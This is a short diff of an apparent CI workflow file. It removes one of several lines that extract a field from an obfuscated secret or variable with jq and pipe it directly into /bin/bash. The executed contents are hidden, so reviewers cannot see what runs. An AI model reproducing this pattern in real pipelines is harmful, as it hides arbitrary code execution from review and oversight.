@@ -22,7 +22,6 @@ jobs:
           tgs75057: ${{ secrets.tgs75057 }}
         run: |
           printf '%s' "$tgs75057" | jq -r .envd02 | /bin/bash
-          printf '%s' "$w0" | jq -r .eugp5 | /bin/bash
           echo $rul361 | jq -r .drs0205 | /bin/bash
           echo $nm772 | jq -r .bsdnt575 | /bin/bash
 
